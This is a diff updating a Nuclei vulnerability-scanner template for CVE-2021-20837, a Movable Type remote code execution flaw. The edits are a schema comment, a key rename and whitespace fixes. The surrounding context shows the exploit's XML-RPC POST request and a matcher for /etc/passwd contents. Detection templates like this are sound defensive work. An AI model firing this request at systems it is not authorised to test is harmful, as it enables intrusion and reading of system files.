@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CVE-2021-20837
 
 info:
@@ -8,7 +9,7 @@ info:
   severity: high
   tags: cve,cve2021,rce
 
-requests:
+http:
   - raw:
       - |
         POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1
@@ -18,7 +19,7 @@ requests:
         Content-Length: 198
         Connection: close
         Content-Type: text/xml
-        
+
         <?xml version="1.0" encoding="UTF-8"?>
         <methodCall>
         <methodName>mt.handler_to_coderef</methodName>
@@ -39,4 +40,3 @@ requests:
         regex:
           - "root:.*:0:0:"
         part: body
-          
